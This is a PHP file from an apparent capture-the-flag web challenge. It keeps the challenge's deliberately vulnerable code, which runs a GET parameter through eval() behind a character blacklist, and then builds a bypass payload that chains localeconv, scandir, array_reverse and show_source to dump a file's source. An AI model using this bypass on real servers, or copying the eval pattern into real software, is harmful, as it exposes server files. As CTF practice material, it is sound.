<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


//if(isset($_GET['c'])){
//    $c = $_GET['c'];
//    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
//        eval($c);
//    }
//
//}else{
//    highlight_file(__FILE__);
//}
//$c = "print_r(localeconv());";
//$c = "print_r(pos(localeconv()));";
//$c = "print_r(scandir(pos(localeconv())));";
//$c = "print_r(array_reverse(scandir(pos(localeconv()))));";
//$c = "print_r(next(array_reverse(scandir(pos(localeconv())))))";
$c = "print_r(show_source(next(array_reverse(scandir(pos(localeconv()))))));";

    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }

